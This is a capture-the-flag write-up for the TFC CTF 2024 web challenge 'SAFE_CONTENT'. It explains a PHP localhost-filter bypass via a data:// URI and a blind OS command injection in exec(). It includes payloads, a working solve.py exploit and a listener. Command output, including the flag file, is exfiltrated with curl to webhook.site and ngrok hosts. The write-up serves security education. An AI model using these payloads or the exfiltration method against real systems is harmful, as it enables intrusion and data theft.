# SAFE_CONTENT

## Table of Contents

  1. [Overview](#overview)  
  2. [Background](#background)  
  3. [Enumeration](#enumeration)  
    3.1. [Bypassing `localhost` Filter](#bypassing-localhost-filter)  
    3.2. [Blind OS Command Injection](#blind-os-command-injection)  
  4. [Exploitation](#exploitation)  
  5. [Conclusion](#conclusion)  

## Overview

- Solved by: @siunam
- 87 solves / 100 points
- Author: @skyv3il
- Difficulty: Medium
- Overall difficulty for me (From 1-10 stars): ★★★★☆☆☆☆☆☆

## Background

Our site has been breached. Since then we restricted the ips we can get files from. This should reduce our attack surface since no external input gets into our app. Is it safe ?  
  
For the source code, go to /src.php

![](https://github.com/siunam321/CTF-Writeups/blob/main/TFC-CTF-2024/images/Pasted%20image%2020240805134445.png)

## Enumeration

Index page:

![](https://github.com/siunam321/CTF-Writeups/blob/main/TFC-CTF-2024/images/Pasted%20image%2020240805134555.png)

In here, we can submit a URL and the web application responses back the URL's content to us.

Let's try it!

![](https://github.com/siunam321/CTF-Writeups/blob/main/TFC-CTF-2024/images/Pasted%20image%2020240805134757.png)

![](https://github.com/siunam321/CTF-Writeups/blob/main/TFC-CTF-2024/images/Pasted%20image%2020240805134808.png)

Hmm... Nothing happened.

When we clicked the "Fetch Content" button, it'll send a GET request to `/` with parameter `url`.

There's not much we can do in here.

In this challenge, we can go to [`/src.php`](https://github.com/siunam321/CTF-Writeups/blob/main/TFC-CTF-2024/Web/SAFE_CONTENT/src.php) to view the source code of this challenge:

![](https://github.com/siunam321/CTF-Writeups/blob/main/TFC-CTF-2024/images/Pasted%20image%2020240805134929.png)

Let's read the source code and see what we can find.

After reviewing this web application source code, we have the following findings:

1. This web application is written in PHP
2. The content that's fetched from our parameter `url` value is **base64 decoded** and parsed to the built-in PHP function **`exec`** to execute **OS command**
3. **Only `localhost` is allowed** to be fetched

Let's dive deeper into those findings!

First, when endpoint `index.php` or `/` received a GET request with parameter `url`, it'll **parse our `url` parameter to PHP function `parse_url`** to validate whether if the value of our parameter is matched to `localhost` or not:

```php
function isAllowedIP($url, $allowedHost) {
    $parsedUrl = parse_url($url);
    
    if (!$parsedUrl || !isset($parsedUrl['host'])) {
        return false;
    }
    
    return $parsedUrl['host'] === $allowedHost;
}
[...]
if ($_SERVER['REQUEST_METHOD'] === 'GET' && isset($_GET['url'])) {
    $url = $_GET['url'];
    $allowedIP = 'localhost';
    
    if (isAllowedIP($url, $allowedIP)) {
        [...]
    }
}
```

After validating our `url` parameter's value, it'll **read the requested URL/file via PHP function `file_get_contents` and base64 decode the result**:

```php
function fetchContent($url) {
    $context = stream_context_create([
        'http' => [
            'timeout' => 5 // Timeout in seconds
        ]
    ]);

    $content = @file_get_contents($url, false, $context);
    if ($content === FALSE) {
        $error = error_get_last();
        throw new Exception("Unable to fetch content from the URL. Error: " . $error['message']);
    }
    return base64_decode($content);
}

if ($_SERVER['REQUEST_METHOD'] === 'GET' && isset($_GET['url'])) {
    [...]
    if (isAllowedIP($url, $allowedIP)) {
        $content = fetchContent($url);
        [...]
    }
}
```

Finally, if the read is successful, it uses the PHP function `exec` to execute an OS command. The OS command is basically writing our base64 decoded content to a new file in `/tmp/` and ignoring the errors:

```php
if ($_SERVER['REQUEST_METHOD'] === 'GET' && isset($_GET['url'])) {
    [...]
    if (isAllowedIP($url, $allowedIP)) {
        $content = fetchContent($url);
        // file upload removed due to security issues
        if ($content) {
            $command = 'echo ' . $content . ' | base64 > /tmp/' . date('YmdHis') . '.tfc';
            exec($command . ' > /dev/null 2>&1');
            // this should fix it
        }
    }
}
```

Since there's **no sanitization or character escaping** in the fetched content, it's clear that **this `exec` function is vulnerable to OS command injection**.

More specifically, it's **blind** OS command injection, because the output of the injected payload is stored in the `/tmp/` directory and thus not reflected to us.

So, our objective of this challenge, is to somehow **bypass the `localhost` filter and execute arbitrary OS commands via the fetched content**.

### Bypassing `localhost` Filter

First off, let's figure out **how to bypass the `localhost` filter**.

In the PHP world, many weird things have been implemented. For instance, **[PHP wrappers](https://www.php.net/manual/en/wrappers.php)**.

Based on my experience, if there's **no sanitization in PHP function `file_get_contents`**, we could abuse **PHP wrappers** to achieve attacks like arbitrary file reads, RCE (Remote Code Execution).

If we take a look at the [PHP wrapper documentation](https://www.php.net/manual/en/wrappers.php), you'll noticed that there's a wrapper called [`data://`](https://www.php.net/manual/en/wrappers.data.php), which is defined in [RFC 2397](https://www.rfc-editor.org/rfc/rfc2397).

> The **data URI scheme** is a [uniform resource identifier (URI)](https://en.wikipedia.org/wiki/Uniform_resource_identifier "Uniform resource identifier") scheme that provides a way to include data in-line in [Web pages](https://en.wikipedia.org/wiki/Web_page "Web page") as if they were external resources. It is a form of file literal or [here document](https://en.wikipedia.org/wiki/Here_document "Here document"). This technique allows normally separate elements such as images and style sheets to be fetched in a single [Hypertext Transfer Protocol (HTTP)](https://en.wikipedia.org/wiki/Hypertext_Transfer_Protocol "Hypertext Transfer Protocol") request,[...] - [https://en.wikipedia.org/wiki/Data_URI_scheme](https://en.wikipedia.org/wiki/Data_URI_scheme)

Basically what this `data` URI scheme does is to include a resource in an HTML document without any external resources. For example, we can include a base64 encoded JPEG image using the `data` URI scheme with the following syntax:

```
data:image/jpeg;base64,/9j/4AAQSkZJRgABAgAAZABkAAD[...]
```

The above example can be broken down into this:
- `data:` is the scheme
- `image/jpeg;` is the optional MIME type (Content type), and it's the MIME type of a JPEG image
- `base64,`. This is optional, it denotes that the data's value is base64 encoded
- `/9j/4AAQSkZJRgABAgAAZABkAAD[...]`. This is the data part, which contains the value of the data

Hmm... Can we use this **`data` URI scheme (which is supported in PHP) to write any base64 encoded data**?

Let's test this. Here's a simple PHP code to demonstrate that:

```php
<?php
$payload = "foobar";
$base64EncodedPayload = base64_encode($payload);
$url = "data:text/plain,$base64EncodedPayload";
echo "[*] Payload: $payload\n";
echo "[*] URL: $url\n";

$parsedUrl = parse_url($url);
echo "[*] Parsed URL:\n";
var_dump($parsedUrl);

$content = base64_decode(file_get_contents($url));
echo "[*] Final content: $content";
?>
```

If we save it as a file and run it with the PHP interpreter, we should able to see this result:

```shell
┌[siunam♥Mercury]-(~/ctf/TFC-CTF-2024/Web/SAFE_CONTENT)-[2024.08.05|14:43:51(HKT)]
└> php test.php
[*] Payload: foobar
[*] URL: data:text/plain,Zm9vYmFy
[*] Parsed URL:
array(2) {
  ["scheme"]=>
  string(4) "data"
  ["path"]=>
  string(19) "text/plain,Zm9vYmFy"
}
[*] Final content: foobar
```

As we can see, PHP function `file_get_contents` outputted `foobar` using the `data` URI scheme!

However, we also need to trick the parsed URL's `host` to be `localhost`. How?

According to [RFC 1738 section 3.1](https://datatracker.ietf.org/doc/html/rfc1738#section-3.1), the URL (Uniform Resource Locators) standard, we can see that URL has this syntax:

```
//<user>:<password>@<host>:<port>/<url-path>
```

In here, the `@` symbol denotes that the first part is a credential pair, where the username and password is separated with a `:` character, and the last part is the hostname.

Hmm... Can we trick the parsed URL's host to be `localhost` via the `@` symbol? Like this:

```php
$url = "data:text@localhost/plain,$base64EncodedPayload";
```

```shell
┌[siunam♥Mercury]-(~/ctf/TFC-CTF-2024/Web/SAFE_CONTENT)-[2024.08.05|14:54:05(HKT)]
└> php test.php
[*] Payload: foobar
[*] URL: data:text@localhost/plain,Zm9vYmFy
[*] Parsed URL:
array(2) {
  ["scheme"]=>
  string(4) "data"
  ["path"]=>
  string(29) "text@localhost/plain,Zm9vYmFy"
}
[*] Final content: foobar
```

Uhh... No?? Oh wait, the `data` URI scheme didn't start with a double slash (`//`).

> [...]**The scheme specific data start with a double slash "//"** to indicate that it complies with the common Internet scheme syntax. - [RFC 1738 section 3.1](https://datatracker.ietf.org/doc/html/rfc1738#section-3.1)

Hmm... Does the `data` URI scheme supports that? In its RFC, it doesn't mention that. However, if we look at [this note in PHP documentation about `data` URI scheme wrapper](https://www.php.net/manual/en/wrappers.data.php#85581), PHP actually supports the `data` URI scheme to start with a double slash:

![](https://github.com/siunam321/CTF-Writeups/blob/main/TFC-CTF-2024/images/Pasted%20image%2020240805145923.png)

Let's test it!

```php
$url = "data://text@localhost/plain,$base64EncodedPayload";
```

```shell
┌[siunam♥Mercury]-(~/ctf/TFC-CTF-2024/Web/SAFE_CONTENT)-[2024.08.05|14:54:21(HKT)]
└> php test.php
[*] Payload: foobar
[*] URL: data://text@localhost/plain,Zm9vYmFy
[*] Parsed URL:
array(4) {
  ["scheme"]=>
  string(4) "data"
  ["host"]=>
  string(9) "localhost"
  ["user"]=>
  string(4) "text"
  ["path"]=>
  string(15) "/plain,Zm9vYmFy"
}
[*] Final content: foobar
```

Oh! Let's go! We successfully tricked PHP function `parse_url` to parse our `data` URI scheme to have host `localhost` and returned our payload's content!

Nice!

### Blind OS Command Injection

Now that we can bypass the `localhost` filter in the parsed URL, let's figure out how to exploit this blind OS command injection vulnerability!

But before we test this, let's update our test script:

```php
<?php
$payload = "foobar";
$base64EncodedPayload = base64_encode($payload);
$url = "data://text@localhost/plain,$base64EncodedPayload";
echo "[*] Payload: $payload\n";
echo "[*] URL: $url\n";

$parsedUrl = parse_url($url);
echo "[*] Parsed URL:\n";
var_dump($parsedUrl);

$content = base64_decode(file_get_contents($url));
echo "[*] Final content: $content\n";

// $ echo <our_base64_decoded_payload> | base64 > /tmp/<current_timestamp>.tfc > /dev/null 2>&1
$command = 'echo ' . $content . ' | base64 > /tmp/' . date('YmdHis') . '.tfc > /dev/null 2>&1';
echo "[*] Executed OS command: $command\n";
exec($command);
?>
```

Now, to exploit this OS command injection vulnerability, we'll need to:
1. **Escape** the `echo` command
2. Use `&&` bitwise and operator to execute the next command
3. **Comment out** the rest of the intended command via `#` character

Here's the payload:

```php
$payload = "'' && id #";
```

If we run the script, we shouldn't get any result:

```shell
┌[siunam♥Mercury]-(~/ctf/TFC-CTF-2024/Web/SAFE_CONTENT)-[2024.08.05|15:15:31(HKT)]
└> php test.php
[*] Payload: '' && id #
[*] URL: data://text@localhost/plain,JycgJiYgaWQgIw==
[*] Parsed URL:
array(4) {
  ["scheme"]=>
  string(4) "data"
  ["host"]=>
  string(9) "localhost"
  ["user"]=>
  string(4) "text"
  ["path"]=>
  string(23) "/plain,JycgJiYgaWQgIw=="
}
[*] Final content: '' && id #
[*] Executed OS command: echo '' && id # | base64 > /tmp/20240805071534.tfc > /dev/null 2>&1
```

This is because the executed OS command didn't reflect back to us. Hence, this is a **blind** OS command injection vulnerability.

There're many ways to exfiltrate the executed OS command result, such as:
- Write the result into a publicly accessible path, like `/var/www/html/`
- DNS exfiltration

For me, I'll using an exfiltration method that i've learned in [PortSwigger Web Security Academy](https://portswigger.net/web-security), which is via `curl`.

In `curl` command, we can **read the stdin (standard input) and send the contents as the body of a POST request** using the `-d @-` argument.

Now, we can use any webhook services like [webhook.site](https://webhook.site) or host our own web application to receive the exfiltrated POST request.

For simplicity, I'll be using [webhook.site](https://webhook.site).

To test this, we'll modify the payload to this:

```php
$payload = "'' && id | base64 | curl -d @- https://webhook.site/<your_webhook_id> #";
```

> Note: The `base64` encoding is optional, it makes the exfiltrate data more readable when we receive it.

Let's run the test script!

```shell
┌[siunam♥Mercury]-(~/ctf/TFC-CTF-2024/Web/SAFE_CONTENT)-[2024.08.05|15:31:21(HKT)]
└> php test.php
[*] Payload: '' && id | base64 | curl -d @- https://webhook.site/367aade8-0921-466e-b2c7-a27889efe898 #
[*] URL: data://text@localhost/plain,JycgJiYgaWQgfCBiYXNlNjQgfCBjdXJsIC1kIEAtIGh0dHBzOi8vd2ViaG9vay5zaXRlLzM2N2FhZGU4LTA5MjEtNDY2ZS1iMmM3LWEyNzg4OWVmZTg5OCAj
[*] Parsed URL:
array(4) {
  ["scheme"]=>
  string(4) "data"
  ["host"]=>
  string(9) "localhost"
  ["user"]=>
  string(4) "text"
  ["path"]=>
  string(127) "/plain,JycgJiYgaWQgfCBiYXNlNjQgfCBjdXJsIC1kIEAtIGh0dHBzOi8vd2ViaG9vay5zaXRlLzM2N2FhZGU4LTA5MjEtNDY2ZS1iMmM3LWEyNzg4OWVmZTg5OCAj"
}
[*] Final content: '' && id | base64 | curl -d @- https://webhook.site/367aade8-0921-466e-b2c7-a27889efe898 #
[*] Executed OS command: echo '' && id | base64 | curl -d @- https://webhook.site/367aade8-0921-466e-b2c7-a27889efe898 # | base64 > /tmp/20240805073128.tfc > /dev/null 2>&1
[...]
```

We should be able to see an incoming POST request in our webhook:

![](https://github.com/siunam321/CTF-Writeups/blob/main/TFC-CTF-2024/images/Pasted%20image%2020240805153252.png)

Let's decode the base64 encoded result!

```shell
┌[siunam♥Mercury]-(~/ctf/TFC-CTF-2024/Web/SAFE_CONTENT)-[2024.08.05|15:31:43(HKT)]
└> echo 'dWlkPTEwMDAoc2l1bmFtKSBnaWQ9MTAwMChuYW0pIGdyb3Vwcz0xMDAwKG5hbSksNChhZG0pLDIwKGRpYWxvdXQpLDI0KGNkcm9tKSwyNShmbG9wcHkpLDI3KHN1ZG8pLDI5KGF1ZGlvKSwzMChkaXApLDQ0KHZpZGVvKSw0NihwbHVnZGV2KSwxMDkobmV0ZGV2KSwxMTkod2lyZXNoYXJrKSwxMjIoYmx1ZXRvb3RoKSwxMzQoc2Nhbm5lciksMTQyKGthYm94ZXIpLDE0Myhkb2NrZXIpCg==' | base64 -d 
uid=1000(siunam) gid=1000(nam) groups=1000(nam),4(adm),20(dialout),24(cdrom),25(floppy),27(sudo),29(audio),30(dip),44(video),46(plugdev),109(netdev),119(wireshark),122(bluetooth),134(scanner),142(kaboxer),143(docker)
```

Boom! We got it!

## Exploitation

Armed with the above information, we can write a solve script to get the flag!

`app.py`, A Python Flask web application to catch incoming POST request:

```python
#!/usr/bin/env python3
from flask import Flask, request
from base64 import b64decode

app = Flask(__name__)

@app.route('/', methods=['POST'])
def index():
    formData = request.form

    result = str()
    for data in formData:
        paddedBase64EncodedResult = data + '=' * (-len(data) % 4)
        result += b64decode(paddedBase64EncodedResult).decode().strip()

    print(f'[+] We successfully received a POST body data:\n{result}')
    return ''

if __name__ == '__main__':
    app.run('0.0.0.0', port=80, debug=True)
```

`solve.py`, A Python script to send our payload to the remote challenge instance:

```python
#!/usr/bin/env python3
import requests
from base64 import b64encode

def solve(attackerUrl, challengeBaseUrl, command):
    payload = f'"" && {command} | base64 | curl -d @- {attackerUrl} #'
    base64EncodedPayload = b64encode(payload.encode()).decode()
    url = f'data://text@localhost/plain,{base64EncodedPayload}'
    print(f'[*] Sending payload: {payload}')
    print(f'[*] Final URL: {url}')

    requests.get(f'{challengeBaseUrl}/', params={ 'url': url })

if __name__ == '__main__':
    attackerUrl = 'https://2322-{REDACTED}.ngrok-free.app/'
    challengeBaseUrl = 'http://challs.tfcctf.com:31936'

    try:
        while True:
            command = input('$ ')
            solve(attackerUrl, challengeBaseUrl, command)
    except KeyboardInterrupt:
        print('\n[*] Bye!')
```

- Run `app.py` to start our Flask web application

```shell
┌[siunam♥Mercury]-(~/ctf/TFC-CTF-2024/Web/SAFE_CONTENT)-[2024.08.05|15:56:46(HKT)]
└> python3 app.py
 * Serving Flask app 'app'
 * Debug mode: on
WARNING: This is a development server. Do not use it in a production deployment. Use a production WSGI server instead.
 * Running on all addresses (0.0.0.0)
 * Running on http://127.0.0.1:80
 * Running on http://10.69.96.69:80
[...]
```

- Port forwarding our Flask web application

```shell
┌[siunam♥Mercury]-(~/ctf/TFC-CTF-2024/Web/SAFE_CONTENT)-[2024.08.05|15:56:26(HKT)]
└> ngrok http 80
[...]
Forwarding                    https://2322-{REDACTED}.ngrok-free.app -> http://localhost:80
[...]
```

- Run the `solve.py`

```shell
┌[siunam♥Mercury]-(~/ctf/TFC-CTF-2024/Web/SAFE_CONTENT)-[2024.08.05|16:02:34(HKT)]
└> python3 solve.py
$ id
[*] Sending payload: "" && id | base64 | curl -d @- https://2322-{REDACTED}.ngrok-free.app/ #
[*] Final URL: data://text@localhost/plain,IiI[...]
$ 
```

- Result can be seen in our `app.py` log

```shell
[+] We successfully received a POST body data:
uid=33(www-data) gid=33(www-data) groups=33(www-data)
127.0.0.1 - - [05/Aug/2024 16:02:58] "POST / HTTP/1.1" 200 -
```

Let's get the flag!

```shell
$ ls -lah /
[*] Sending payload: "" && ls -lah / | base64 | curl -d @- https://2322-{REDACTED}.ngrok-free.app/ #
[*] Final URL: data://text@localhost/plain,IiI[...]
```

```shell
[+] We successfully received a POST body data:
total 80K
drwxr-xr-x   1 root root 4.0K Aug  5 05:44 .
drwxr-xr-x   1 root root 4.0K Aug  5 05:44 ..
drwxr-xr-x   1 root root 4.0K Nov 15  2022 bin
drwxr-xr-x   2 root root 4.0K Sep  3  2022 boot
drwxr-xr-x   5 root root  360 Aug  5 05:44 dev
drwxr-xr-x   1 root root 4.0K Aug  5 05:44 etc
-rw-rw-r--   1 root root   72 Aug  1 22:05 flag.txt
drwxr-xr-x   2 root root 4.0K Sep  3  2022 home
drwxr-xr-x   1 root root 4.0K Nov 15  2022 lib
drwxr-xr-x   2 root root 4.0K Nov 14  2022 lib64
drwxr-xr-x   2 root root 4.0K Nov 14  2022 media
drwxr-xr-x   2 root root 4.0K Nov 14  2022 mnt
drwxr-xr-x   2 root root 4.0K Nov 14  2022 opt
dr-xr-xr-x 196 root root    0 Aug  5 05:44 proc
drwx------   1 root root 4.0K Nov 15  2022 root
drwxr-xr-x   1 root root 4.0K Aug  5 05:44 run
drwxr-xr-x   1 root root 4.0K Nov 15  2022 sbin
drwxr-xr-x   2 root root 4.0K Nov 14  2022 srv
dr-xr-xr-x  13 root root    0 Aug  5 05:44 sys
drwxrwxrwt   1 root root 4.0K Nov 15  2022 tmp
drwxr-xr-x   1 root root 4.0K Nov 14  2022 usr
drwxr-xr-x   1 root root 4.0K Nov 15  2022 var
127.0.0.1 - - [05/Aug/2024 16:05:09] "POST / HTTP/1.1" 200 -
```

```shell
$ cat /flag.txt
[*] Sending payload: "" && cat /flag.txt | base64 | curl -d @- https://2322-{REDACTED}.ngrok-free.app/ #
[*] Final URL: data://text@localhost/plain,IiI[...]
```

```shell
[+] We successfully received a POST body data:
TFCCTF{0cc5c7c5be395bb7e7456224117aed15b7d7f25933e126cecfbff41bff12beeb}
127.0.0.1 - - [05/Aug/2024 16:05:27] "POST / HTTP/1.1" 200 -
```

- **Flag: `TFCCTF{0cc5c7c5be395bb7e7456224117aed15b7d7f25933e126cecfbff41bff12beeb}`**

## Conclusion

What we've learned:

1. PHP function `parse_url` host filter bypass via `data` URI scheme
2. Blind OS command injection